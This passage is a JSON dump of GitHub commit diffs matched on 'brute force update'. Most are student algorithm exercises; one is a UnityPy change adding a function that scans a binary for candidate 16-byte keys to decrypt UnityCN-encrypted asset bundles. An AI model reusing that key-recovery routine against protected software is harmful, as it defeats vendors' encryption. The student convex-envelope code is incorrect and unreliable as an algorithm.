No newline at end of file\ndiff --git a\/pybruteforce\/kernal.py b\/pybruteforce\/kernalfns.py\nsimilarity index 100%\nrename from pybruteforce\/kernal.py\nrename to pybruteforce\/kernalfns.py\ndiff --git a\/pybruteforce\/stepfnconvolnoise.py b\/pybruteforce\/stepfnconvolnoise.py\nindex 8cd7d6b..51e522d 100644\n--- a\/pybruteforce\/stepfnconvolnoise.py\n+++ b\/pybruteforce\/stepfnconvolnoise.py\n@@ -7,12 +7,12 @@\n #convolutestepfn\n convol_stepfn = continuousFourierconvol(ystepfn,u1)#--->contFourier used cos g1(t) is a cont. fn\n #add guass noise\n-convol_stepfn_plusnoise = ()\n+#convol_stepfn_plusnoise = ()\n #plot graphs\n figs,axs =plt.subplots(2,2)\n axs[0,0].step(xstepfn,ystepfn)\n axs[0,0].plot(t,u1)\n axs[0,1].plot(convol_stepfn)\n-axs[1,1].plot(convol_stepfn_plusnoise)\n+#axs[1,1].plot(convol_stepfn_plusnoise)\n plt.savefig(\"stepfnbconvol.png\")\n plt.show()\n\\ No newline at end of file\ndiff --git a\/pybruteforce\/testfn.py b\/pybruteforce\/testfns.py\nsimilarity index 100%\nrename from pybruteforce\/testfn.py\nrename to pybruteforce\/testfns.py\n","message":"","files":{"\/pybruteforce\/guassiannoise.py":{"changes":[{"diff":"\n-import numpy as np\n+import numpy as np\n\\ No newline at end of ","add":1,"remove":1,"filename":"\/pybruteforce\/guassiannoise.py","badparts":["import numpy as np"],"goodparts":["import numpy as np"]}],"source":"\nimport numpy as np ","sourceWithComments":"import numpy as np\n"},"\/pybruteforce\/stepfnconvolnoise.py":{"changes":[{"diff":"\n #convolutestepfn\n convol_stepfn = continuousFourierconvol(ystepfn,u1)#--->contFourier used cos g1(t) is a cont. fn\n #add guass noise\n-convol_stepfn_plusnoise = ()\n+#convol_stepfn_plusnoise = ()\n #plot graphs\n figs,axs =plt.subplots(2,2)\n axs[0,0].step(xstepfn,ystepfn)\n axs[0,0].plot(t,u1)\n axs[0,1].plot(convol_stepfn)\n-axs[1,1].plot(convol_stepfn_plusnoise)\n+#axs[1,1].plot(convol_stepfn_plusnoise)\n plt.savefig(\"stepfnbconvol.png\")\n plt.show()\n\\ No newline at end o","add":2,"remove":2,"filename":"\/pybruteforce\/stepfnconvolnoise.py","badparts":["convol_stepfn_plusnoise = ()","axs[1,1].plot(convol_stepfn_plusnoise)"],"goodparts":[]}],"source":"\nimport numpy as np, matplotlib.pyplot as plt, scipy as sc from testfn import xstepfn,ystepfn from kernal import t,u1 from convolution import continuousFourierconvol, discreteFourierconvol stepfn=(xstepfn,ystepfn) print(xstepfn.size,ystepfn.size,t,u1) convol_stepfn=continuousFourierconvol(ystepfn,u1) convol_stepfn_plusnoise=() figs,axs=plt.subplots(2,2) axs[0,0].step(xstepfn,ystepfn) axs[0,0].plot(t,u1) axs[0,1].plot(convol_stepfn) axs[1,1].plot(convol_stepfn_plusnoise) plt.savefig(\"stepfnbconvol.png\") plt.show() ","sourceWithComments":"import numpy as np, matplotlib.pyplot as plt, scipy as sc\nfrom testfn import xstepfn,ystepfn\nfrom kernal import t,u1\nfrom convolution import continuousFourierconvol, discreteFourierconvol\nstepfn = (xstepfn,ystepfn)\nprint(xstepfn.size,ystepfn.size,t,u1)\n#convolutestepfn\nconvol_stepfn = continuousFourierconvol(ystepfn,u1)#--->contFourier used cos g1(t) is a cont. fn\n#add guass noise\nconvol_stepfn_plusnoise = ()\n#plot graphs\nfigs,axs =plt.subplots(2,2)\naxs[0,0].step(xstepfn,ystepfn)\naxs[0,0].plot(t,u1)\naxs[0,1].plot(convol_stepfn)\naxs[1,1].plot(convol_stepfn_plusnoise)\nplt.savefig(\"stepfnbconvol.png\")\nplt.show()"}},"msg":"update brute force branch"}},"https:\/\/github.com\/athena272\/algorithm-design-analysis":{"5d1616319eb773c0357a90e14abe87bb623be44c":{"url":"https:\/\/api.github.com\/repos\/athena272\/algorithm-design-analysis\/commits\/5d1616319eb773c0357a90e14abe87bb623be44c","html_url":"https:\/\/github.com\/athena272\/algorithm-design-analysis\/commit\/5d1616319eb773c0357a90e14abe87bb623be44c","sha":"5d1616319eb773c0357a90e14abe87bb623be44c","keyword":"brute force update","diff":"diff --git a\/006_convex_envelope_brute_force.py b\/006_convex_envelope_brute_force.py\nindex 4be3146..a1d4b99 100644\n--- a\/006_convex_envelope_brute_force.py\n+++ b\/006_convex_envelope_brute_force.py\n@@ -37,13 +37,6 @@ def convex_envelope_brute_force(points):\n \n # The examples 3 and 4 should return an empty list [] since the input points are collinear and do not form a Convex Envelope.\n \n-\n-# Example 0\n-points = [(1, 1), (2, 2), (2, 0), (2, 4), (3, 3), (4, 2)]\n-print(convex_envelope_brute_force(points))\n-# []\n-line()\n-\n # Example 1\n points = [(0, 0), (1, 0), (1, 1), (0, 1), (0.5, 0.5)]\n print(convex_envelope_brute_force(points))\n","message":"","files":{"\/006_convex_envelope_brute_force.py":{"changes":[{"diff":"\n \n # The examples 3 and 4 should return an empty list [] since the input points are collinear and do not form a Convex Envelope.\n \n-\n-# Example 0\n-points = [(1, 1), (2, 2), (2, 0), (2, 4), (3, 3), (4, 2)]\n-print(convex_envelope_brute_force(points))\n-# []\n-line()\n-\n # Example 1\n points = [(0, 0), (1, 0), (1, 1), (0, 1), (0.5, 0.5)]\n print(convex_envelope_brute_force(points))\n","add":0,"remove":7,"filename":"\/006_convex_envelope_brute_force.py","badparts":["points = [(1, 1), (2, 2), (2, 0), (2, 4), (3, 3), (4, 2)]","print(convex_envelope_brute_force(points))","line()"],"goodparts":[]}],"source":"\n import itertools def line(): print(\"=+=\" * 25) def convex_envelope_brute_force(points): n=len(points) max_area=0 envelope=[] for comb in itertools.combinations(points, n -1): poly=list(comb) +[points[0]] area=0 for i in range(n -1): j=(i +1) % n area +=poly[i][0] * poly[j][1] -poly[j][0] * poly[i][1] if area > max_area: max_area=area envelope=poly return envelope points=[(1, 1),(2, 2),(2, 0),(2, 4),(3, 3),(4, 2)] print(convex_envelope_brute_force(points)) line() points=[(0, 0),(1, 0),(1, 1),(0, 1),(0.5, 0.5)] print(convex_envelope_brute_force(points)) line() points=[(1, 2),(2, 3),(3, 4),(4, 5),(5, 6)] print(convex_envelope_brute_force(points)) line() points=[(0, 0),(1, 1),(2, 2),(3, 3),(4, 4)] print(convex_envelope_brute_force(points)) line() points=[(0, 0),(1, 2),(2, 4),(3, 6),(4, 8)] print(convex_envelope_brute_force(points)) ","sourceWithComments":"# A brute-force approach to finding the Convex Envelope of a set of points in Python is to generate all possible combinations of points and calculate the area of the convex polygon formed by those points. The combination with the maximum area is the Convex Envelope.\n\n# Note that this is a naive implementation, and its time complexity is O(N^2) where N is the number of points. For larger datasets, it may be impractical to use a brute-force approach, and more efficient algorithms should be used instead.\n\nimport itertools\n\n\ndef line():\n    print(\"=+=\" * 25)\n\n\ndef convex_envelope_brute_force(points):\n    n = len(points)\n    max_area = 0\n    envelope = []\n\n    # Generate all possible combinations of points\n    for comb in itertools.combinations(points, n - 1):\n        poly = list(comb) + [points[0]]\n        area = 0\n\n        # Calculate the area of the convex polygon\n        for i in range(n - 1):\n            j = (i + 1) % n\n            area += poly[i][0] * poly[j][1] - poly[j][0] * poly[i][1]\n\n        # Check if this combination has a larger area than the previous maximum\n        if area > max_area:\n            max_area = area\n            envelope = poly\n\n    return envelope\n\n# In this example, the points list contains 5 points in a two-dimensional plane. The convex_envelope_brute_force function is called with the points list as an argument, and the expected output is a list of points that form the Convex Envelope of the input points. The output list is a convex polygon that encloses the maximum area between the input points, and it contains the same number of points as the input list.F\n\n# In each of these examples, the convex_envelope_brute_force function is called with a different list of points, and the expected output is a list of points that form the Convex Envelope of the input points. The output list is a convex polygon that encloses the maximum area between the input points, and it contains the same number of points as the input list.\n\n# The examples 3 and 4 should return an empty list [] since the input points are collinear and do not form a Convex Envelope.\n\n\n# Example 0\npoints = [(1, 1), (2, 2), (2, 0), (2, 4), (3, 3), (4, 2)]\nprint(convex_envelope_brute_force(points))\n# []\nline()\n\n# Example 1\npoints = [(0, 0), (1, 0), (1, 1), (0, 1), (0.5, 0.5)]\nprint(convex_envelope_brute_force(points))\n# [(0, 0), (1, 0), (1, 1), (0, 1), (0, 0)]\nline()\n\n# Example 2\npoints = [(1, 2), (2, 3), (3, 4), (4, 5), (5, 6)]\nprint(convex_envelope_brute_force(points))\n# [(1, 2), (5, 6), (5, 6), (1, 2), (1, 2)]\nline()\n\n# Example 3\npoints = [(0, 0), (1, 1), (2, 2), (3, 3), (4, 4)]\nprint(convex_envelope_brute_force(points))\n# []\nline()\n\n# Example 4\npoints = [(0, 0), (1, 2), (2, 4), (3, 6), (4, 8)]\nprint(convex_envelope_brute_force(points))\n# []\n\n"}},"msg":"Update 006_convex_envelope_brute_force.py"},"9641f728371aab2f99c06ef1a5b6d0fd145e3f80":{"url":"https:\/\/api.github.com\/repos\/athena272\/algorithm-design-analysis\/commits\/9641f728371aab2f99c06ef1a5b6d0fd145e3f80","html_url":"https:\/\/github.com\/athena272\/algorithm-design-analysis\/commit\/9641f728371aab2f99c06ef1a5b6d0fd145e3f80","message":"Update 009_brute_force_class.py","sha":"9641f728371aab2f99c06ef1a5b6d0fd145e3f80","keyword":"brute force update","diff":"diff --git a\/009_brute_force_class.py b\/009_brute_force_class.py\nindex 9689299..a655b1c 100644\n--- a\/009_brute_force_class.py\n+++ b\/009_brute_force_class.py\n@@ -1,2 +1,13 @@\n def convex_envelope_brute_force(points):\n-    a = \n\\ No newline at end of file\n+    n = len(points)\n+    for i in range(n):\n+        # a = y2 - y1 \n+        a = points[i + 1][1] - points[i][1]\n+        # b = x1 - x2\n+        b = points[i][0] - points[i + 1][0]\n+        # c = x1y2 - y1x2\n+        \n+\n+a = [(0, 0), (1, 1)]\n+\n+print(a[1][1])\n\\ No newline at end of file\n","files":{"\/009_brute_force_class.py":{"changes":[{"diff":"\n def convex_envelope_brute_force(points):\n-    a = \n\\ No newline at end of file\n+    n = len(points)\n+    for i in range(n):\n+        # a = y2 - y1 \n+        a = points[i + 1][1] - points[i][1]\n+        # b = x1 - x2\n+        b = points[i][0] - points[i + 1][0]\n+        # c = x1y2 - y1x2\n+        \n+\n+a = [(0, 0), (1, 1)]\n+\n+print(a[1][1])\n\\ No newline at end of file\n","add":12,"remove":1,"filename":"\/009_brute_force_class.py","badparts":["    a = "],"goodparts":["    n = len(points)","    for i in range(n):","        a = points[i + 1][1] - points[i][1]","        b = points[i][0] - points[i + 1][0]","a = [(0, 0), (1, 1)]","print(a[1][1])"]}],"source":"\ndef convex_envelope_brute_force(points): a= ","sourceWithComments":"def convex_envelope_brute_force(points):\n    a = "}},"msg":"Update 009_brute_force_class.py"}},"https:\/\/github.com\/jaimevictor\/UFRPE-Proj-2-":{"58950e838455ac4bf6c09b39d56d2ae182ec5c2c":{"url":"https:\/\/api.github.com\/repos\/jaimevictor\/UFRPE-Proj-2-\/commits\/58950e838455ac4bf6c09b39d56d2ae182ec5c2c","html_url":"https:\/\/github.com\/jaimevictor\/UFRPE-Proj-2-\/commit\/58950e838455ac4bf6c09b39d56d2ae182ec5c2c","sha":"58950e838455ac4bf6c09b39d56d2ae182ec5c2c","keyword":"brute force update","diff":"diff --git a\/Brute_force.py b\/Brute_force.py\nindex adfa76f..a25d20b 100644\n--- a\/Brute_force.py\n+++ b\/Brute_force.py\n@@ -1,11 +1,7 @@\n-import itertools\r\n-\r\n-\r\n-def format_input(q_line, q_column):\r\n+def format_input(q_line):\r\n     points = {}\r\n     for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n         line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n-        # assert len(line) > q_column, \"ERRO: Mais linhas do que deveria\"  # Tratamento pra erro de digita\u00e7\u00e3o\r\n         a = len(line)\r\n         for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n             if line[j] != '0':\r\n@@ -13,10 +9,22 @@ def format_input(q_line, q_column):\n     return points\r\n \r\n \r\n+def permutations(points):\r\n+    if len(points) == 1:\r\n+        return [points]\r\n+    final_list = []\r\n+    for index, i in enumerate(points):\r\n+        points_left = points[:index] + points[index+1:]\r\n+        z = permutations(points_left)\r\n+        for t in z:\r\n+            final_list.append([i] + t)\r\n+    return final_list\r\n+\r\n+\r\n def routing(points):  # Permuta todos os pontos\r\n     del points['R']  # Remove o inicio temporariamente da conta\r\n     points = list(item for item in points)\r\n-    permutation = itertools.permutations(points)\r\n+    permutation = permutations(points)\r\n     routes = ['R' + \"\".join(route) + 'R' for route in permutation]  # Adiciona ao fim e come\u00e7o de cada rota permutada\r\n     return routes\r\n \r\n@@ -34,7 +42,7 @@ def calculate_route(route, allpoints):  # Calcula o custo da rota recebida\n \r\n while True:\r\n     q_line, q_column = list(map(int, input().split()))\r\n-    all_points = format_input(q_line, q_column)\r\n+    all_points = format_input(q_line)\r\n     all_routes = routing(all_points.copy())\r\n     route_cost = [0] * len(all_routes)\r\n     for i in range(len(all_routes)):\r\n@@ -42,4 +50,4 @@ def calculate_route(route, allpoints):  # Calcula o custo da rota recebida\n         route_cost[i] = calculate_route(route, all_points)\r\n     lowest_cost = min(route_cost)  # Menor custo entre todas as rotas\r\n     cheap_route = all_routes[route_cost.index(lowest_cost)]  # Pegar indice da lista do menor valor e recolher rota de mesmo indice\r\n-    print(cheap_route)\n\\ No newline at end of file\n+    print(cheap_route)\r\n","message":"","files":{"\/Brute_force.py":{"changes":[{"diff":"\n-import itertools\r\n-\r\n-\r\n-def format_input(q_line, q_column):\r\n+def format_input(q_line):\r\n     points = {}\r\n     for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n         line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n-        # assert len(line) > q_column, \"ERRO: Mais linhas do que deveria\"  # Tratamento pra erro de digita\u00e7\u00e3o\r\n         a = len(line)\r\n         for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n             if line[j] != '0':\r\n","add":1,"remove":5,"filename":"\/Brute_force.py","badparts":["import itertools\r","\r","\r","def format_input(q_line, q_column):\r"],"goodparts":["def format_input(q_line):\r"]},{"diff":"\n     return points\r\n \r\n \r\n+def permutations(points):\r\n+    if len(points) == 1:\r\n+        return [points]\r\n+    final_list = []\r\n+    for index, i in enumerate(points):\r\n+        points_left = points[:index] + points[index+1:]\r\n+        z = permutations(points_left)\r\n+        for t in z:\r\n+            final_list.append([i] + t)\r\n+    return final_list\r\n+\r\n+\r\n def routing(points):  # Permuta todos os pontos\r\n     del points['R']  # Remove o inicio temporariamente da conta\r\n     points = list(item for item in points)\r\n-    permutation = itertools.permutations(points)\r\n+    permutation = permutations(points)\r\n     routes = ['R' + \"\".join(route) + 'R' for route in permutation]  # Adiciona ao fim e come\u00e7o de cada rota permutada\r\n     return routes\r\n \r\n","add":13,"remove":1,"filename":"\/Brute_force.py","badparts":["    permutation = itertools.permutations(points)\r"],"goodparts":["def permutations(points):\r","    if len(points) == 1:\r","        return [points]\r","    final_list = []\r","    for index, i in enumerate(points):\r","        points_left = points[:index] + points[index+1:]\r","        z = permutations(points_left)\r","        for t in z:\r","            final_list.append([i] + t)\r","    return final_list\r","\r","\r","    permutation = permutations(points)\r"]},{"diff":"\n \r\n while True:\r\n     q_line, q_column = list(map(int, input().split()))\r\n-    all_points = format_input(q_line, q_column)\r\n+    all_points = format_input(q_line)\r\n     all_routes = routing(all_points.copy())\r\n     route_cost = [0] * len(all_routes)\r\n     for i in range(len(all_routes)):\r\n","add":1,"remove":1,"filename":"\/Brute_force.py","badparts":["    all_points = format_input(q_line, q_column)\r"],"goodparts":["    all_points = format_input(q_line)\r"]},{"diff":"\n         route_cost[i] = calculate_route(route, all_points)\r\n     lowest_cost = min(route_cost)  # Menor custo entre todas as rotas\r\n     cheap_route = all_routes[route_cost.index(lowest_cost)]  # Pegar indice da lista do menor valor e recolher rota de mesmo indice\r\n-    print(cheap_route)\n\\ No newline at end of file\n+    print(cheap_route)\r\n","add":1,"remove":1,"filename":"\/Brute_force.py","badparts":["    print(cheap_route)"],"goodparts":["    print(cheap_route)\r"]}],"source":"\nimport itertools\r \r \r def format_input(q_line, q_column):\r points={}\r for i in range(q_line): line=list(map(str, input().split())) a=len(line)\r for j in range(len(line)): if line[j] !='0':\r points[line[j]]=(i, j)\r return points\r \r \r def routing(points): del points['R'] points=list(item for item in points)\r permutation=itertools.permutations(points)\r routes=['R' +\"\".join(route) +'R' for route in permutation] return routes\r \r \r def calculate_route(route, allpoints): cost=0\r for k in range(len(route)-1):\r actual_point=route[k]\r next_point=route[k+1]\r actual_point=allpoints.get(actual_point) next_point=allpoints.get(next_point) cost +=(abs(actual_point[0]-next_point[0]) +abs(actual_point[1]-next_point[1])) return cost\r \r \r while True:\r q_line, q_column=list(map(int, input().split()))\r all_points=format_input(q_line, q_column)\r all_routes=routing(all_points.copy())\r route_cost=[0] * len(all_routes)\r for i in range(len(all_routes)):\r route=all_routes[i]\r route_cost[i]=calculate_route(route, all_points)\r lowest_cost=min(route_cost) cheap_route=all_routes[route_cost.index(lowest_cost)] print(cheap_route) ","sourceWithComments":"import itertools\r\n\r\n\r\ndef format_input(q_line, q_column):\r\n    points = {}\r\n    for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n        line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n        # assert len(line) > q_column, \"ERRO: Mais linhas do que deveria\"  # Tratamento pra erro de digita\u00e7\u00e3o\r\n        a = len(line)\r\n        for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n            if line[j] != '0':\r\n                points[line[j]] = (i, j)\r\n    return points\r\n\r\n\r\ndef routing(points):  # Permuta todos os pontos\r\n    del points['R']  # Remove o inicio temporariamente da conta\r\n    points = list(item for item in points)\r\n    permutation = itertools.permutations(points)\r\n    routes = ['R' + \"\".join(route) + 'R' for route in permutation]  # Adiciona ao fim e come\u00e7o de cada rota permutada\r\n    return routes\r\n\r\n\r\ndef calculate_route(route, allpoints):  # Calcula o custo da rota recebida\r\n    cost = 0\r\n    for k in range(len(route)-1):\r\n        actual_point = route[k]\r\n        next_point = route[k+1]\r\n        actual_point = allpoints.get(actual_point)  # Recolhe os valores do ponto atual\r\n        next_point = allpoints.get(next_point)  # recolhe os valores do prox ponto\r\n        cost += (abs(actual_point[0]-next_point[0]) + abs(actual_point[1]-next_point[1]))  # Soma o custo dessa movimenta\u00e7\u00e3o at\u00e9 a final\r\n    return cost\r\n\r\n\r\nwhile True:\r\n    q_line, q_column = list(map(int, input().split()))\r\n    all_points = format_input(q_line, q_column)\r\n    all_routes = routing(all_points.copy())\r\n    route_cost = [0] * len(all_routes)\r\n    for i in range(len(all_routes)):\r\n        route = all_routes[i]\r\n        route_cost[i] = calculate_route(route, all_points)\r\n    lowest_cost = min(route_cost)  # Menor custo entre todas as rotas\r\n    cheap_route = all_routes[route_cost.index(lowest_cost)]  # Pegar indice da lista do menor valor e recolher rota de mesmo indice\r\n    print(cheap_route)"}},"msg":"Update Brute_force.py\n\nAdding recursive permutation,  and removing used variables"},"43757755869199486219b584e0ff00a499d81036":{"url":"https:\/\/api.github.com\/repos\/jaimevictor\/UFRPE-Proj-2-\/commits\/43757755869199486219b584e0ff00a499d81036","html_url":"https:\/\/github.com\/jaimevictor\/UFRPE-Proj-2-\/commit\/43757755869199486219b584e0ff00a499d81036","message":"Update Brute_force.py\n\nUpdating the naming on some variables","sha":"43757755869199486219b584e0ff00a499d81036","keyword":"brute force update","diff":"diff --git a\/Brute_force.py b\/Brute_force.py\nindex a25d20b..95603b6 100644\n--- a\/Brute_force.py\n+++ b\/Brute_force.py\n@@ -1,11 +1,10 @@\n def format_input(q_line):\r\n     points = {}\r\n-    for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n+    for n in range(q_line):  # Recebe a quantidade correta de linhas\r\n         line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n-        a = len(line)\r\n         for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n             if line[j] != '0':\r\n-                points[line[j]] = (i, j)\r\n+                points[line[j]] = (n, j)\r\n     return points\r\n \r\n \r\n@@ -13,11 +12,11 @@ def permutations(points):\n     if len(points) == 1:\r\n         return [points]\r\n     final_list = []\r\n-    for index, i in enumerate(points):\r\n+    for index, m in enumerate(points):\r\n         points_left = points[:index] + points[index+1:]\r\n         z = permutations(points_left)\r\n         for t in z:\r\n-            final_list.append([i] + t)\r\n+            final_list.append([m] + t)\r\n     return final_list\r\n \r\n \r\n","files":{"\/Brute_force.py":{"changes":[{"diff":"\n def format_input(q_line):\r\n     points = {}\r\n-    for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n+    for n in range(q_line):  # Recebe a quantidade correta de linhas\r\n         line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n-        a = len(line)\r\n         for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n             if line[j] != '0':\r\n-                points[line[j]] = (i, j)\r\n+                points[line[j]] = (n, j)\r\n     return points\r\n \r\n \r\n","add":2,"remove":3,"filename":"\/Brute_force.py","badparts":["    for i in range(q_line):  # Recebe a quantidade correta de linhas\r","        a = len(line)\r","                points[line[j]] = (i, j)\r"],"goodparts":["    for n in range(q_line):  # Recebe a quantidade correta de linhas\r","                points[line[j]] = (n, j)\r"]},{"diff":"\n     if len(points) == 1:\r\n         return [points]\r\n     final_list = []\r\n-    for index, i in enumerate(points):\r\n+    for index, m in enumerate(points):\r\n         points_left = points[:index] + points[index+1:]\r\n         z = permutations(points_left)\r\n         for t in z:\r\n-            final_list.append([i] + t)\r\n+            final_list.append([m] + t)\r\n     return final_list\r\n \r\n \r\n","add":2,"remove":2,"filename":"\/Brute_force.py","badparts":["    for index, i in enumerate(points):\r","            final_list.append([i] + t)\r"],"goodparts":["    for index, m in enumerate(points):\r","            final_list.append([m] + t)\r"]}],"source":"\ndef format_input(q_line):\r points={}\r for i in range(q_line): line=list(map(str, input().split())) a=len(line)\r for j in range(len(line)): if line[j] !='0':\r points[line[j]]=(i, j)\r return points\r \r \r def permutations(points):\r if len(points)==1:\r return[points]\r final_list=[]\r for index, i in enumerate(points):\r points_left=points[:index] +points[index+1:]\r z=permutations(points_left)\r for t in z:\r final_list.append([i] +t)\r return final_list\r \r \r def routing(points): del points['R'] points=list(item for item in points)\r permutation=permutations(points)\r routes=['R' +\"\".join(route) +'R' for route in permutation] return routes\r \r \r def calculate_route(route, allpoints): cost=0\r for k in range(len(route)-1):\r actual_point=route[k]\r next_point=route[k+1]\r actual_point=allpoints.get(actual_point) next_point=allpoints.get(next_point) cost +=(abs(actual_point[0]-next_point[0]) +abs(actual_point[1]-next_point[1])) return cost\r \r \r while True:\r q_line, q_column=list(map(int, input().split()))\r all_points=format_input(q_line)\r all_routes=routing(all_points.copy())\r route_cost=[0] * len(all_routes)\r for i in range(len(all_routes)):\r route=all_routes[i]\r route_cost[i]=calculate_route(route, all_points)\r lowest_cost=min(route_cost) cheap_route=all_routes[route_cost.index(lowest_cost)] print(cheap_route)\r ","sourceWithComments":"def format_input(q_line):\r\n    points = {}\r\n    for i in range(q_line):  # Recebe a quantidade correta de linhas\r\n        line = list(map(str, input().split()))  # P\u00f5e tudo numa lista\r\n        a = len(line)\r\n        for j in range(len(line)):  # Percorre a linha pra adicionar no dicionario\r\n            if line[j] != '0':\r\n                points[line[j]] = (i, j)\r\n    return points\r\n\r\n\r\ndef permutations(points):\r\n    if len(points) == 1:\r\n        return [points]\r\n    final_list = []\r\n    for index, i in enumerate(points):\r\n        points_left = points[:index] + points[index+1:]\r\n        z = permutations(points_left)\r\n        for t in z:\r\n            final_list.append([i] + t)\r\n    return final_list\r\n\r\n\r\ndef routing(points):  # Permuta todos os pontos\r\n    del points['R']  # Remove o inicio temporariamente da conta\r\n    points = list(item for item in points)\r\n    permutation = permutations(points)\r\n    routes = ['R' + \"\".join(route) + 'R' for route in permutation]  # Adiciona ao fim e come\u00e7o de cada rota permutada\r\n    return routes\r\n\r\n\r\ndef calculate_route(route, allpoints):  # Calcula o custo da rota recebida\r\n    cost = 0\r\n    for k in range(len(route)-1):\r\n        actual_point = route[k]\r\n        next_point = route[k+1]\r\n        actual_point = allpoints.get(actual_point)  # Recolhe os valores do ponto atual\r\n        next_point = allpoints.get(next_point)  # recolhe os valores do prox ponto\r\n        cost += (abs(actual_point[0]-next_point[0]) + abs(actual_point[1]-next_point[1]))  # Soma o custo dessa movimenta\u00e7\u00e3o at\u00e9 a final\r\n    return cost\r\n\r\n\r\nwhile True:\r\n    q_line, q_column = list(map(int, input().split()))\r\n    all_points = format_input(q_line)\r\n    all_routes = routing(all_points.copy())\r\n    route_cost = [0] * len(all_routes)\r\n    for i in range(len(all_routes)):\r\n        route = all_routes[i]\r\n        route_cost[i] = calculate_route(route, all_points)\r\n    lowest_cost = min(route_cost)  # Menor custo entre todas as rotas\r\n    cheap_route = all_routes[route_cost.index(lowest_cost)]  # Pegar indice da lista do menor valor e recolher rota de mesmo indice\r\n    print(cheap_route)\r\n"}},"msg":"Update Brute_force.py\n\nUpdating the naming on some variables"}},"https:\/\/github.com\/K0lb3\/UnityPy":{"42245a3abdb33a0017aba6af229f5f40ef911934":{"url":"https:\/\/api.github.com\/repos\/K0lb3\/UnityPy\/commits\/42245a3abdb33a0017aba6af229f5f40ef911934","html_url":"https:\/\/github.com\/K0lb3\/UnityPy\/commit\/42245a3abdb33a0017aba6af229f5f40ef911934","message":"Fix UnityCN Decryption + brute-force function (#168)\n\n* fix UnityCN decryption\r\n\r\n* ArchiveStorageManager - add brute-force function and better error description.\r\n\r\n* Update __init__.py","sha":"42245a3abdb33a0017aba6af229f5f40ef911934","keyword":"brute force update","diff":"diff --git a\/UnityPy\/__init__.py b\/UnityPy\/__init__.py\nindex c7f92f4..a229cd1 100644\n--- a\/UnityPy\/__init__.py\n+++ b\/UnityPy\/__init__.py\n@@ -1,4 +1,4 @@\n-__version__ = \"1.9.24\"\n+__version__ = \"1.9.25\"\n \n from .environment import Environment\n from .helpers.ArchiveStorageManager import set_assetbundle_decrypt_key\ndiff --git a\/UnityPy\/files\/BundleFile.py b\/UnityPy\/files\/BundleFile.py\nindex 618e975..622d9aa 100644\n--- a\/UnityPy\/files\/BundleFile.py\n+++ b\/UnityPy\/files\/BundleFile.py\n@@ -1,7 +1,7 @@\n # TODO: implement encryption for saving files\n from collections import namedtuple\n import re\n-from typing import Tuple\n+from typing import Tuple, Union\n \n from . import File\n from ..enums import ArchiveFlags, ArchiveFlagsOld, CompressionFlags\n@@ -106,6 +106,9 @@ def read_fs(self, reader: EndianBinaryReader):\n         else:\n             self.dataflags = ArchiveFlags(self.dataflags)\n \n+        if self.dataflags & self.dataflags.UsesAssetBundleEncryption:\n+            self.decryptor = ArchiveStorageManager.ArchiveStorageDecryptor(reader)\n+\n         if self.version >= 7:\n             reader.align_stream(16)\n \n@@ -117,8 +120,6 @@ def read_fs(self, reader: EndianBinaryReader):\n             blocksInfoBytes = reader.read_bytes(compressedSize)\n             reader.Position = start\n         else:  # 0x40 kArchiveBlocksAndDirectoryInfoCombined\n-            if self.dataflags & self.dataflags.UsesAssetBundleEncryption:\n-                self.decryptor = ArchiveStorageManager.ArchiveStorageDecryptor(reader)\n             blocksInfoBytes = reader.read_bytes(compressedSize)\n \n         blocksInfoBytes = self.decompress_data(\n@@ -385,7 +386,11 @@ def save_fs(self, writer: EndianBinaryWriter, data_flag: int, block_info_flag: i\n         writer.Position = writer_end_pos\n \n     def decompress_data(\n-        self, compressed_data: bytes, uncompressed_size: int, flags: int, index: int = 0\n+        self,\n+        compressed_data: bytes,\n+        uncompressed_size: int,\n+        flags: Union[int, ArchiveFlags, ArchiveFlagsOld],\n+        index: int = 0,\n     ) -> bytes:\n         \"\"\"\n         Parameters\n@@ -401,7 +406,7 @@ def decompress_data(\n         -------\n         bytes\n             The decompressed data.\"\"\"\n-        comp_flag = flags & ArchiveFlags.CompressionTypeMask\n+        comp_flag = CompressionFlags(flags & ArchiveFlags.CompressionTypeMask)\n \n         if comp_flag == CompressionFlags.LZMA:  # LZMA\n             return CompressionHelper.decompress_lzma(compressed_data)\ndiff --git a\/UnityPy\/helpers\/ArchiveStorageManager.py b\/UnityPy\/helpers\/ArchiveStorageManager.py\nindex 62c1b46..6ddd2a2 100644\n--- a\/UnityPy\/helpers\/ArchiveStorageManager.py\n+++ b\/UnityPy\/helpers\/ArchiveStorageManager.py\n@@ -1,4 +1,5 @@\n # based on: https:\/\/github.com\/Razmoth\/PGRStudio\/blob\/master\/AssetStudio\/PGR\/PGR.cs\n+import re\n from typing import Tuple, Union\n \n from ..streams import EndianBinaryReader\n@@ -20,7 +21,8 @@ def set_assetbundle_decrypt_key(key: Union[bytes, str]):\n \n def read_vector(reader: EndianBinaryReader) -> Tuple[bytes, bytes]:\n     data = reader.read_bytes(0x10)\n-    key = reader.read_string_to_null().encode(\"utf-8\", \"surrogateescape\")\n+    key = reader.read_bytes(0x10)\n+    reader.Position += 1\n \n     return data, key\n \n@@ -32,6 +34,28 @@ def decrypt_key(key: bytes, data: bytes, keybytes: bytes):\n     return bytes(x ^ y for x, y in zip(data, key))\n \n \n+def brute_force_key(\n+    fp: str,\n+    key_sig: bytes,\n+    data_sig: bytes,\n+    pattern: re.Pattern = re.compile(rb\"(?=(\\w{16}))\"),\n+    verbose: bool = False,\n+):\n+    with open(fp, \"rb\") as f:\n+        data = f.read()\n+\n+    matches = pattern.findall(data)\n+    for i, key in enumerate(matches):\n+        if verbose:\n+            print(f\"Trying {i + 1}\/{len(matches)} - {key}\")\n+        signature = decrypt_key(key_sig, data_sig, key)\n+        if signature == UNITY3D_SIGNATURE:\n+            if verbose:\n+                print(f\"Found key: {key}\")\n+            return key\n+ 